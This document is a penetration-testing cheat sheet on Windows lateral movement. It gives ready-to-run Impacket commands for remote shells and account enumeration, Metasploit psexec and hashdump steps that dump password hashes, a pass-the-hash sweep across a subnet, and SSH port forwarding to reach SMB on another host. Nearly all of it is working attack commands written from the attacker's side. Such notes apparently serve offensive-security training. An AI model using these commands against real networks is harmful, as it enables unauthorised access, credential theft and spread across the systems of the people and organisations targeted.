# Lateral Movement

## Impacket
### wmiexec.py
`wmicexec.py` connects to DCOM ports (i.e., the WMI service) on the target. 
```bash
# attacker Terminal 1:
wmiexec.py john@target whoami     # specify a single command to run
wmiexec.py john@target            # invoke a semi-interactive shell
```

### smbexec.py
`smbexec.py` connects to SMB ports on the target. 
```bash
# attacker Terminal 1:
smbexec.py john@target            # invoke a semi-interactive shell
# use the full-path to change directories
```

### lookupsid.py 
`lookupsid.py` enumerates local and domain accounts (i.e., their RIDs and usernames). 
```bash
# attacker Terminal 1:
lookupsid.py 192.168.1.69              # use an anonymous/null session
lookupsid.py john@192.168.1.69         # use a local account
lookupsid.py evilcorp/elliot@192.168.1.5 # use a domain account on a domain controller
```

## Pass-the-Hash
### Metasploit and PsExec 
Login to target 1 using `exploit/windows/smb/psexec`. 
```bash
# attacker Terminal 1:
msfconsole 
use exploit/windows/smb/psexec
set SMBDOMAIN evilcorp
set SMBUSER john
set SMBPASSWORD Password123!
set RHOST 192.168.1.69
options
run
```

Change exploits to `post/windows/gather/hashdump` and dump the hashes stored in memory.
```bash
# attacker Terminal 1: (after a shell has been opened)
background                       # put the SMB session in the background
use post/windows/gather/hashdump # change exploits
set SESSION 1                    # configure your exploit to use the SMB session in the background
options                          # check your exploit settings
run                              # dumps password hints and hashes
```

Attempt to login to other targets previously identified using one of the usernames and hashes you just dumped. 
```bash
use exploit/windows/smb/psexec
set SMBDOMAIN evilcorp
set SMBUSER elliot
set SMBPASSWORD 1a8d397270a1c210c7de787d4d082cf4
set RHOSTS 192.168.1.61,62,63,64,65,66,67,68,69
options
run
```

## SSH
```bash
# attacker Terminal 1:
# any connections to port 4444 on .69 get forwarded to port 445 on .5
ssh john@192.168.1.69 -L 4444:192.168.1.5:445
```